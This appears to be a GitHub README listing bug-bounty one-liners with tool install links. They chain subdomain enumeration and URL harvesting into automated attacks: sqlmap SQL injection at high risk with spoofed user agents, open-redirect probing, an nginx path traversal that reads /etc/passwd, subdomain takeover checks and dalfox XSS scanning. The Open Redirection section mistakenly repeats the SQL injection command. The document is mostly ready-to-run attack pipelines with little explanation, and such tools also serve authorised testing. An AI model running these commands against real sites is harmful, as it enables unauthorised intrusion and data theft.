# One-Liner-Collections
This Repositories contains list of One Liners with Descriptions and Installation requirements

────────────────────────────────────────────────────────────────────────



# SQL Injection

## Installation Requirements
1. Subfinder   : https://github.com/projectdiscovery/subfinder 
2. GAU         : https://github.com/lc/gau
3. GF          : https://github.com/tomnomnom/gf
4. Findomain   : https://github.com/Findomain/Findomain
5. HTTPX       : https://github.com/projectdiscovery/httpx
6. Anew        : https://github.com/tomnomnom/anew
7. Waybackurls : https://github.com/tomnomnom/waybackurls

## OneLiner
```
subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
```

```
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```
───────────────────────────────────────────────────────────────────────────────────────



# Open Redirection

## Installation Requirements
1. Waybackurls : https://github.com/tomnomnom/waybackurls
2. Bhedak      : https://github.com/R0X4R/bhedak
3. GAU         : https://github.com/lc/gau
4. GF          : https://github.com/tomnomnom/gf
5. QS-Replace  : https://github.com/tomnomnom/qsreplace
6. HTTPX       : https://github.com/projectdiscovery/httpx

## OneLiner
```
subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
```

```
gau http://testphp.vulnweb.com | tee -a archive 1>/dev/null && gf redirect archive | cut -f 3- -d ':' | qsreplace "https://cybertix.in" | httpx -silent -status-code -location
```
───────────────────────────────────────────────────────────────────────────────────────



# NGINX Path Traversal

## Installation Requirements
1. HTTPX : https://github.com/projectdiscovery/httpx


## OneLiner
```
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```

───────────────────────────────────────────────────────────────────────────────────────



# Subdomain Takeover

## Installation Requirements
1. Subfinder    : https://github.com/projectdiscovery/subfinder 
2. Assetfinder  : https://github.com/tomnomnom/assetfinder
3. Amass        : https://github.com/OWASP/Amass
4. Subjack      : https://github.com/haccer/subjack


## OneLiner
```
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> takeover ;
```

───────────────────────────────────────────────────────────────────────────────────────



# Extract URLs from Source Code

## OneLiner
```
curl "https://TARGET.Com" | grep -oP '(https*.//|www\.)[^]*'
```

───────────────────────────────────────────────────────────────────────────────────────



# XSS (Cross-Site Scripting)

## Installation Requirements
1. Katana    : https://github.com/projectdiscovery/katana
2. Dalfox    : https://github.com/hahwul/dalfox


## OneLiner
```
echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
```

───────────────────────────────────────────────────────────────────────────────────────



# Find Endpoints in JS

## Installation Requirements
1. Katana    : https://github.com/projectdiscovery/katana
2. Anew      : https://github.com/tomnomnom/anew


## OneLiner
```
katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
```
